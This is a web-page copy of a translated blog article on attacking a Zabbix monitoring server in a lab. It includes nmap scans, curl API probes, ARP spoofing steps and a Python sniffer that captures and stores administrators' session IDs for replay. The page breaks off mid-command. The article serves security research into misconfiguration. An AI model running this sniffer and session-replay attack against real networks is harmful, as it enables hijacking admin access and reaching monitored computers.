<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Monitoring system as an entry point to enterprise computers</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="This is a continuation of the memo about the monitoring system Zabbix, recently published in our blog. Many thanks to the user Shodin , who made a sig...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Monitoring system as an entry point to enterprise computers</h1><div class="post__text post__text-html js-mediator-article">  This is a continuation of the memo about the monitoring system Zabbix, recently published in our blog.  <a href="https://habrahabr.ru/users/shodin/" class="user_link">Many</a> thanks to the user <a href="https://habrahabr.ru/users/shodin/" class="user_link">Shodin</a> , who made a significant contribution to the study and wrote this article. <br><br>  Monitoring systems are a very practical component for managing the network structure of an enterprise.  They allow you to see the changes that occur with devices almost in real time.  And with the growth of the number of devices in the network, the role of the solution, which is able to centrally control devices, is multiplying. <br><br>  In the simplest case, you want to see the availability of computers, monitor the operation of devices (for example, switches over ipmi), see changes in hardware configuration and send alerts about it. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Monitoring system can do a lot.  But what if the attacker tries to use her capabilities for his own purposes?  Can an attacker, due to the capabilities of Zabbix, launch attacks against hosts monitored with Zabbix? <br>  Fearfully?  Under the cat, consider what an attacker can do, having access to the Zabbix monitoring system, security and configuration, to which insufficient attention has been paid. <br><a name="habracut"></a><br>  For research, I put together a simple test environment on virtual machines using VirtualBox: <br><br><ul><li>  Zabbix server - it will monitor the computer. </li><li>  The PC is the computer monitored by the Zabbix server. </li><li>  Hacker - virtualka maliciously. </li><li>  Host OS - I log in with it as an administrator on the Zabbix server. </li></ul><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/sq/d_/-m/sqd_-mmywvv6viavxow2t2wbkyu.png"></div><br>  <i>Model circuit</i> <br><div class="spoiler">  <b class="spoiler_title">Overview of Zabbix operation.</b> <div class="spoiler_text">  A Zabbix agent is installed on each client PC, which will exchange data with the Zabbix server. <br><br>  In Zabbix server, PC monitoring is configured, as part of monitoring, the server searches for the installed agent on the PC and receives information from it. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/bu/w6/gx/buw6gxpnljqlppq1jbyijcdpipq.png"></div>  <i>Search and obtain information from the agent</i> <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/q8/0m/fc/q80mfc6_5-sgzk1xai3f4bq0jxa.png"></div>  <i>Search and obtain information from the agent</i> <br><br>  By default, the following TCP ports are used to exchange information between Zabbix agent and Zabbix server: on the client side, port 10051 is configured (and listened) and port 10050 is configured (and listened) on the server side. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/jp/7c/3k/jp7c3kodfifgtkykxo22l0se3r4.png"></div>  <i>Listening port</i> <br>  The server adjusts the frequency of polling clients for changes in the data that the server receives from the agent.  Setting the detection interval is set in the Configuration menu - Discovery of the Zabbix web-interface.  Next, a new discovery rule is created (Discovery Rule).  In the parameter settings, the Delay parameter is specified, which is responsible for the frequency of polling clients with the server.  By default, this interval is 3600s, less than 5s, the polling interval is not set. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/yw/-d/ay/yw-days9b5fd7bkpxvnd0da3rve.png"></div>  <i>Target Detection Rule</i> <br><br>  On each client, a Zabbix agent is installed, the settings of which are specified in the configuration file.  More details about the work of the agent can be found <a href="https://www.zabbix.com/documentation/3.0/ru/manual/concepts/agent">here</a> . <br></div></div><br>  The following options were set in the model for monitoring the PC in the agent config: <br><br><ul><li>  Server - server address (in the model - 192.168.56.102). </li><li>  ServerActive - server address for active checks (most often it coincides with the server address). </li><li>  Hostname is the name of the host.  It is sent by the agent to the server, which forwards the list of active checks for the host with the specified name.  It must match the name specified for the host in the Zabbix server web interface. </li><li>  EnableRemoteCommands = 1 - allows running commands that the server sends to the agent.  The command will be run by the agent. </li><li>  Timeout = 30 - the time during which data exchange between the client and the server should occur, by default the option is commented out, and its value is 3s.  I will put 30s and see if this is enough for an attacker? </li></ul><br><h4>  Possible scenario of the attacker's actions </h4><br>  To simplify the simulation, consider a typical situation in which the attacker and the Zabbix server are on the same subnet.  The Zabbix server on the network is most often configured in such a way that it monitors the PC and runs remote commands there. <br>  It is difficult to say how true this situation is.  From personal experience of using Zabbix-server, I note that one of the goals of implementing Zabbix on the network, which I once admin, among other things, was the launch of remote commands on network computers. <br><br>  What an attacker needs to do: <br><br><ol><li>  Detect Zabbix server on the network. </li><li>  Get access to the frontend of Zabbix server. </li><li>  Get access to computers and gain a foothold in the system. </li></ol><br>  Next, consider how the attacker will solve these problems. <br><br><h4>  Detection of a working Zabbix server in the network </h4><br>  First, the attacker determines whether the Zabbix server is deployed on the network.  The most obvious way to determine a working Zabbix server is to scan all network network resources for the presence of open ports of the Zabbix server and Zabbix agent on them;  usually the default Zabbix server port is 10051 and the agent is 10050. <br><br>  Scanning is best done at once on both ports, the command: <br><br><pre><code class="nginx hljs"><span class="hljs-attribute"><span class="hljs-attribute">Nmap</span></span> ‚ÄìsS ‚Äìp <span class="hljs-number"><span class="hljs-number">10050</span></span>,<span class="hljs-number"><span class="hljs-number">10051</span></span> <span class="hljs-number"><span class="hljs-number">192.168.56.0</span></span>/<span class="hljs-number"><span class="hljs-number">24</span></span></code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/webt/yp/el/tk/ypeltksm7d5nin6ifphxfr1rqsc.png"></div>  <i>Team Result</i> <br><br>  It can be seen that both ports on the node with the address <b>192.168.56.102</b> are open.  Most likely, this is the server.  But this is not accurate :) Let's try to find out for sure. <br><br>  We use the curl command to check the server address, with its help we will send the following json request to the address <b><a href="http://192.168.56.102/zabbix/api_jsonrpc.php">192.168.56.102/zabbix/api_jsonrpc.php</a></b> : <br><br><pre> <code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"jsonrpc"</span></span>:<span class="hljs-string"><span class="hljs-string">"2.0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"method"</span></span>:<span class="hljs-string"><span class="hljs-string">"user.login"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"params"</span></span>:{ <span class="hljs-attr"><span class="hljs-attr">"user"</span></span>:<span class="hljs-string"><span class="hljs-string">"Admin"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"password"</span></span>:<span class="hljs-string"><span class="hljs-string">"admin"</span></span>},<span class="hljs-attr"><span class="hljs-attr">"auth"</span></span>:<span class="hljs-literal"><span class="hljs-literal">null</span></span>,<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">0</span></span>}</code> </pre> <br>  The attacker does not know the password, but with this request he tries to connect to the server and indicates incorrect data.  The idea is this - if the server is deployed at the selected address, an incorrect login and password error will return, and if there is no server at the specified address, the answers will not return at all, or the string ‚Äúconnection timeout‚Äù will return: <br><br><pre> <code class="nginx hljs"><span class="hljs-attribute"><span class="hljs-attribute">curl</span></span> -i -X POST -H <span class="hljs-string"><span class="hljs-string">'Content-type:application/json'</span></span> -d <span class="hljs-string"><span class="hljs-string">'{"jsonrpc":"2.0","method":"user.login","params":{ "user":"Admin","password":"admin"},"auth":null,"id":0}'</span></span> http://192.168.56.102/zabbix/api_jsonrpc.php HTTP/<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-number"><span class="hljs-number">200</span></span> OK Date: Fri, <span class="hljs-number"><span class="hljs-number">02</span></span> Feb <span class="hljs-number"><span class="hljs-number">2018</span></span> <span class="hljs-number"><span class="hljs-number">08</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> GMT Server: Apache/<span class="hljs-number"><span class="hljs-number">2</span></span>.<span class="hljs-number"><span class="hljs-number">4</span></span>.<span class="hljs-number"><span class="hljs-number">10</span></span> (Debian) Access-Control-Allow-Origin: * Access-Control-Allow-Headers: Content-Type Access-Control-Allow-Methods: POST Access-Control-Max-Age: <span class="hljs-number"><span class="hljs-number">1000</span></span> Content-Length: <span class="hljs-number"><span class="hljs-number">159</span></span> Content-Type: application/json</code> </pre> <br><pre> <code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"jsonrpc"</span></span>:<span class="hljs-string"><span class="hljs-string">"2.0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"error"</span></span>:{<span class="hljs-attr"><span class="hljs-attr">"code"</span></span>:<span class="hljs-number"><span class="hljs-number">-32700</span></span>,<span class="hljs-attr"><span class="hljs-attr">"message"</span></span>:<span class="hljs-string"><span class="hljs-string">"Parse error"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"data"</span></span>:<span class="hljs-string"><span class="hljs-string">"Invalid JSON. An error occurred on the server while parsing the JSON text."</span></span>},<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-literal"><span class="hljs-literal">null</span></span>}</code> </pre> <br>  The server sent the request, so the Zabbix-server is deployed to the checked address. <br>  For comparison, let's see what happens if you send a similar request to the address of another PC found (on which the Zabbix server is not deployed): <br><pre> <code class="hljs scala">curl -i -<span class="hljs-type"><span class="hljs-type">X</span></span> <span class="hljs-type"><span class="hljs-type">POST</span></span> -<span class="hljs-type"><span class="hljs-type">H</span></span> <span class="hljs-symbol"><span class="hljs-symbol">'Content</span></span>-<span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">type</span></span></span></span>:application/json' -d '{<span class="hljs-string"><span class="hljs-string">"jsonrpc"</span></span>:<span class="hljs-string"><span class="hljs-string">"2.0"</span></span>,<span class="hljs-string"><span class="hljs-string">"method"</span></span>:<span class="hljs-string"><span class="hljs-string">"user.login"</span></span>,<span class="hljs-string"><span class="hljs-string">"params"</span></span>:{ <span class="hljs-string"><span class="hljs-string">"user"</span></span>:<span class="hljs-string"><span class="hljs-string">"Admin"</span></span>,<span class="hljs-string"><span class="hljs-string">"password"</span></span>:<span class="hljs-string"><span class="hljs-string">"admin"</span></span>},<span class="hljs-string"><span class="hljs-string">"auth"</span></span>:<span class="hljs-literal"><span class="hljs-literal">null</span></span>,<span class="hljs-string"><span class="hljs-string">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">0</span></span>}' http:<span class="hljs-comment"><span class="hljs-comment">//192.168.56.110/zabbix/api_jsonrpc.php curl: (7) Failed to connect to 192.168.56.110 port 80: Connection refused</span></span></code> </pre> <br>  The whole process can be clearly seen <a href="https://youtu.be/sDNiqXg5JQM">here</a> . <br>  Now let's try to determine the version of the Zabbix server.  Without knowing the login and password, this can be done by parsing the source code of the page <b><a href="http://192.168.56.102/zabbix/index.php">192.168.56.102/zabbix/index.php</a></b> .  The source code of this page contains a link to the documentation with the Zabbix version. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ea/jq/zy/eajqzykpd8epffw1bcfp19mjhuq.png"></div>  <i>Version of Zabbix server found in the source code of the page</i> <br><br>  The figure shows that the server version is 3.2. <br><br>  To automate the version detection, a simple script was written that receives this information from the authorization page of the Zabbix server: <br><br><pre> <code class="python hljs"><span class="hljs-string"><span class="hljs-string">""" This script is for testing zabbix version by version of the docs on the logon page """</span></span> <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urllib2 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> re <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> bs4 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> BeautifulSoup zab_page=<span class="hljs-string"><span class="hljs-string">'http://192.168.56.102/zabbix/index.php'</span></span> page=urllib2.urlopen(zab_page) soup = BeautifulSoup(page, <span class="hljs-string"><span class="hljs-string">'html.parser'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> link <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> soup.findAll(<span class="hljs-string"><span class="hljs-string">'a'</span></span>, attrs={<span class="hljs-string"><span class="hljs-string">'href'</span></span>: re.compile(<span class="hljs-string"><span class="hljs-string">"documentation"</span></span>)}): version=link.get(<span class="hljs-string"><span class="hljs-string">'href'</span></span>) parts=re.split(<span class="hljs-string"><span class="hljs-string">'/'</span></span>, version) a=<span class="hljs-string"><span class="hljs-string">''</span></span>.join (parts[<span class="hljs-number"><span class="hljs-number">4</span></span>:<span class="hljs-number"><span class="hljs-number">5</span></span>]) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"zabbix version is"</span></span>,a</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/webt/-l/aa/bn/-laabnmntez8wu0fayvn1yogr9m.png"></div>  <i>Script result</i> <br><br>  The process of parsing the version of Zabbix server can be found <a href="http://">here</a> . <br><br>  Conclusion - the attacker has enough ways to determine if a working Zabbix server is present on the network. <br><br>  Next, consider how you can access this server. <br><br><h4>  Getting access to the frontend of Zabbix server.  Part one, overview </h4><br>  What will an attacker get from intercepting traffic between the Zabbix server and the agent? <br>  The traffic between the agent and the server (if the agent‚Äôs configuration does not configure encryption of the transmitted data) is transmitted in an unencrypted form, in TCP packets with the PSH flag. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/py/wy/v6/pywyv6wg7cvcis69d79rkgj8kiq.png"></div>  <i>Unencrypted traffic</i> <br><br>  Such traffic can be intercepted and analyzed, but it will not do anything to gain access to the frontend. <br><br>  However, Zabbix is ‚Äã‚Äãwritten in PHP, and the Zabbix API is web-based and shipped as part of the web interface.  JSON-RPC 2.0 protocol is used.  To use most features of Zabbix, it is enough to send HTTP POST requests to the api_jsonrpc.php file, which is located in the folder with the web-interface. <br><br>  This means that when a user is authorized in the system (for example, when the administrator logs in to the Zabbix web interface), the request / response is executed in JSON format.  At the same time for each user generated so-called.  zbx_sessionid, which is used in json POST requests to the Zabbix server.  More details about the implementation of the API can be found <a href="https://www.zabbix.com/documentation/3.0/ru/manual/api">here</a> . <br><br>  How is user authentication?  The first thing you need to get so-called.  authentication key, for this you need to send the user login and password to the server, and if the data were specified correctly, the authentication key will return. <br><br>  The process of transferring zbx_sessionid occurs even in the case of user authorization through the frontend web interface when entering the username and password of this user. <br><br>  Consider an example of getting the value of zbx_sessionid for the Admin user with the password zabbix using the API.  You need to send this line: <br><br><pre> <code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"jsonrpc"</span></span>:<span class="hljs-string"><span class="hljs-string">"2.0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"method"</span></span>:<span class="hljs-string"><span class="hljs-string">"user.login"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"params"</span></span>:{ <span class="hljs-attr"><span class="hljs-attr">"user"</span></span>:<span class="hljs-string"><span class="hljs-string">"Admin"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"password"</span></span>:<span class="hljs-string"><span class="hljs-string">"zabbix"</span></span>},<span class="hljs-attr"><span class="hljs-attr">"auth"</span></span>:<span class="hljs-literal"><span class="hljs-literal">null</span></span>,<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">0</span></span>}</code> </pre> <br>  If you are too lazy to understand, then there <a href="https://jsoneditoronline.org/">is such a service</a> , just for those who prefer the json string in a structured way. <br><br>  Use the curl command to send the generated request: <br><br><pre> <code class="hljs scala">curl -i -<span class="hljs-type"><span class="hljs-type">X</span></span> <span class="hljs-type"><span class="hljs-type">POST</span></span> -<span class="hljs-type"><span class="hljs-type">H</span></span> <span class="hljs-symbol"><span class="hljs-symbol">'Content</span></span>-<span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">type</span></span></span></span>:application/json' -d ' {<span class="hljs-string"><span class="hljs-string">"jsonrpc"</span></span>:<span class="hljs-string"><span class="hljs-string">"2.0"</span></span>,<span class="hljs-string"><span class="hljs-string">"method"</span></span>:<span class="hljs-string"><span class="hljs-string">"user.login"</span></span>,<span class="hljs-string"><span class="hljs-string">"params"</span></span>:{ <span class="hljs-string"><span class="hljs-string">"user"</span></span>:<span class="hljs-string"><span class="hljs-string">"Admin"</span></span>,<span class="hljs-string"><span class="hljs-string">"password"</span></span>:<span class="hljs-string"><span class="hljs-string">"zabbix"</span></span>},<span class="hljs-string"><span class="hljs-string">"auth"</span></span>:<span class="hljs-literal"><span class="hljs-literal">null</span></span>,<span class="hljs-string"><span class="hljs-string">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">0</span></span>}' http:<span class="hljs-comment"><span class="hljs-comment">//192.168.56.102/zabbix/api_jsonrpc.php</span></span></code> </pre> <br>  In response, we get: <br><br><pre> <code class="hljs css">{<span class="hljs-attribute"><span class="hljs-attribute">jsonrpc</span></span>:<span class="hljs-number"><span class="hljs-number">2.0</span></span>,result:d2a72e967fa86307a6ab9b896d8c95b9,id:<span class="hljs-number"><span class="hljs-number">1</span></span>}</code> </pre> <br>  <b>d2a72e967fa86307a6ab9b896d8c95b9</b> - this is the value of zbx_sessionid for the Admin user with the password zabbix.  After receiving the user zbx_sessionid, you can use it to request data: <br><br><pre> <code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"jsonrpc"</span></span>: <span class="hljs-string"><span class="hljs-string">"2.0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"method"</span></span>:<span class="hljs-string"><span class="hljs-string">"host.get"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"params"</span></span>:{<span class="hljs-attr"><span class="hljs-attr">"output"</span></span>: [<span class="hljs-string"><span class="hljs-string">"hostid"</span></span>,<span class="hljs-string"><span class="hljs-string">"host"</span></span>],<span class="hljs-attr"><span class="hljs-attr">"selectInterfaces"</span></span>: [<span class="hljs-string"><span class="hljs-string">"interfaceid"</span></span>,<span class="hljs-string"><span class="hljs-string">"ip"</span></span>]},<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>: <span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-attr"><span class="hljs-attr">"auth"</span></span>: <span class="hljs-string"><span class="hljs-string">" d2a72e967fa86307a6ab9b896d8c95b9"</span></span>}</code> </pre> <br>  Substitute the curl command: <br><br><pre> <code class="hljs scala">curl -i -<span class="hljs-type"><span class="hljs-type">X</span></span> <span class="hljs-type"><span class="hljs-type">POST</span></span> -<span class="hljs-type"><span class="hljs-type">H</span></span> <span class="hljs-symbol"><span class="hljs-symbol">'Content</span></span>-<span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">type</span></span></span></span>:application/json' -d '{<span class="hljs-string"><span class="hljs-string">"jsonrpc"</span></span>: <span class="hljs-string"><span class="hljs-string">"2.0"</span></span>,<span class="hljs-string"><span class="hljs-string">"method"</span></span>:<span class="hljs-string"><span class="hljs-string">"host.get"</span></span>,<span class="hljs-string"><span class="hljs-string">"params"</span></span>:{<span class="hljs-string"><span class="hljs-string">"output"</span></span>: [<span class="hljs-string"><span class="hljs-string">"hostid"</span></span>,<span class="hljs-string"><span class="hljs-string">"host"</span></span>],<span class="hljs-string"><span class="hljs-string">"selectInterfaces"</span></span>: [<span class="hljs-string"><span class="hljs-string">"interfaceid"</span></span>,<span class="hljs-string"><span class="hljs-string">"ip"</span></span>]},<span class="hljs-string"><span class="hljs-string">"id"</span></span>: <span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-string"><span class="hljs-string">"auth"</span></span>: <span class="hljs-string"><span class="hljs-string">" d2a72e967fa86307a6ab9b896d8c95b9"</span></span>} ' http:<span class="hljs-comment"><span class="hljs-comment">//192.168.56.102/zabbix/api_jsonrpc.php</span></span></code> </pre> <br>  We get the following result: <br><br><pre> <code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"jsonrpc"</span></span>:<span class="hljs-string"><span class="hljs-string">"2.0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"result"</span></span>:[{<span class="hljs-attr"><span class="hljs-attr">"hostid"</span></span>:<span class="hljs-string"><span class="hljs-string">"10084"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"host"</span></span>:<span class="hljs-string"><span class="hljs-string">"Zabbix_server"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"interfaces"</span></span>:[{<span class="hljs-attr"><span class="hljs-attr">"interfaceid"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"ip"</span></span>:<span class="hljs-string"><span class="hljs-string">"127.0.0.1"</span></span>}]},{<span class="hljs-attr"><span class="hljs-attr">"hostid"</span></span>:<span class="hljs-string"><span class="hljs-string">"10105"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"host"</span></span>:<span class="hljs-string"><span class="hljs-string">"windows host"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"interfaces"</span></span>:[{<span class="hljs-attr"><span class="hljs-attr">"interfaceid"</span></span>:<span class="hljs-string"><span class="hljs-string">"2"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"ip"</span></span>:<span class="hljs-string"><span class="hljs-string">"192.168.56.1"</span></span>}]},{<span class="hljs-attr"><span class="hljs-attr">"hostid"</span></span>:<span class="hljs-string"><span class="hljs-string">"10106"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"host"</span></span>:<span class="hljs-string"><span class="hljs-string">"Windows host"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"interfaces"</span></span>:[{<span class="hljs-attr"><span class="hljs-attr">"interfaceid"</span></span>:<span class="hljs-string"><span class="hljs-string">"3"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"ip"</span></span>:<span class="hljs-string"><span class="hljs-string">"192.168.56.110"</span></span>}]}],<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">2</span></span>}</code> </pre> <br>  The whole process can be viewed <a href="https://youtu.be/Pajef5GRe1I">here</a> . <br><br>  The value of zbx_sessionid itself is ‚Äúsalted‚Äù by the timestamp, which almost excludes its fake, but it is transmitted in the zbx_sessionid field in the open POST request! <br><br>  In the case of the administrator's traffic interception, when he logs into the system, an attacker can get the administrator's zbx_sessionid and use the obtained value to develop the attack.  This is possible because  change zbx_sessionid occurs only when the user logs off.  In the meantime, it is in the system, zbx_sessionid is periodically sent with each user action. <br><br>  Can the intercepted zbx_sessionid be reused?  Yes, you can, while the user is logged in.  To do this, it‚Äôs just enough to substitute the json request, which then needs to be sent to the server. <br><br>  The conclusion is that zbx_sessionid will be the obvious target of an attacker when intercepting traffic. <br><br><h4>  Getting access to the frontend of Zabbix server.  Part two, practical </h4><br>  To get the admin zbx_sessionid value, an attacker simply listens for the traffic on the network between the Zabbix server and the admin computer. <br><br>  The simplest option is the good old ARP spoofing. <br><br>  In principle, it does not matter how ARP spoofing is implemented - the result will be obtained in any case.  For this study, we used the scapy package for python, a very useful utility for working with network packages. <br><br>  For ‚Äúcatching‚Äù zbx_sessionid, a script was written that opens a socket, listens for traffic, and catches the value of zbx_sessionid in the data sent: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> re s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(<span class="hljs-number"><span class="hljs-number">0x0800</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> (<span class="hljs-string"><span class="hljs-string">"trying to catch zbx_sessionid"</span></span>) k = <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>: data = s.recvfrom(<span class="hljs-number"><span class="hljs-number">65565</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-string"><span class="hljs-string">"HTTP"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> data[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-number"><span class="hljs-number">54</span></span>:]: raw = data[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-number"><span class="hljs-number">54</span></span>:] <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> raw: line = raw.split(<span class="hljs-string"><span class="hljs-string">'\r\n\r\n'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"[*] Header Captured "</span></span> value = line m = re.search(<span class="hljs-string"><span class="hljs-string">"(zbx_sessionid.*)"</span></span>, value) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> m: str = m.group(<span class="hljs-number"><span class="hljs-number">0</span></span>) k = re.split(<span class="hljs-string"><span class="hljs-string">r'\W+'</span></span>, str) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> (<span class="hljs-string"><span class="hljs-string">"session_id is :"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> (k[<span class="hljs-number"><span class="hljs-number">1</span></span>]) <span class="hljs-comment"><span class="hljs-comment">####Saving founded zbx_sessionid in file saved_zbxssids = open('zbx_sessionids.txt','a') saved_zbxssids.write('\n') saved_zbxssids.write(k[1]) saved_zbxssids.write('\n') saved_zbxssids.close() print ("zabbix session id saved in file zbx_sessionids.txt") else: pass else: pass except KeyboardInterrupt: s.close()</span></span></code> </pre> <br>  Values ‚Äã‚Äãare saved in the file zbx_sessionids.txt <br><br>  The attack algorithm is as follows: <br><br><ol><li>  In kali we allow forwarding packets with the command: <br> <code># sysctl ‚Äìw net.ipv4.ip_forward=1</code> </li> <li>  Run the ARP spoofing utility: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/d0/22/yl/d022yl1ho9kq707irudlk4n7hjy.png"></div>  <i>Team Result</i> <br><br>  In this command: <br><br><ul><li>  192.168.56.1 - address of the router </li><li>  192.168.56.102 - Zabbix server address </li></ul></li><li>  Run the written script to intercept http headers with the following command: <pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># python zabbix_zbxsessionid_sniffer.py</span></span></code> </pre> </li><li>  We are waiting for the user to try to connect to the admin panel of the Zabbix server.  And we see the zbx_sessionid we need: <img src="https://habrastorage.org/webt/od/hz/sp/odhzspa9kovijaor6ijfpv5uhlq.png">  <i>Script result</i> </li></ol><br>  Next, we will check if the intercepted zbx_sessionid will allow to get information from the server.  To do this, try to get a list of all users in Zabbix using this request: <br><br><pre> <code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"jsonrpc"</span></span>: <span class="hljs-string"><span class="hljs-string">"2.0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"method"</span></span>: <span class="hljs-string"><span class="hljs-string">"user.get"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"params"</span></span>:{<span class="hljs-attr"><span class="hljs-attr">"output"</span></span>: <span class="hljs-string"><span class="hljs-string">"extend"</span></span>},<span class="hljs-attr"><span class="hljs-attr">"auth"</span></span>:<span class="hljs-string"><span class="hljs-string">"d547a4536e1660e753c765916d44531b"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">1</span></span>}</code> </pre> <br>  Substitute in curl: <br><br><pre> <code class="hljs scala">curl -i -<span class="hljs-type"><span class="hljs-type">X</span></span> <span class="hljs-type"><span class="hljs-type">POST</span></span> -<span class="hljs-type"><span class="hljs-type">H</span></span> <span class="hljs-symbol"><span class="hljs-symbol">'Content</span></span>-<span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">type</span></span></span></span>:application/json' -d '{<span class="hljs-string"><span class="hljs-string">"jsonrpc"</span></span>: <span class="hljs-string"><span 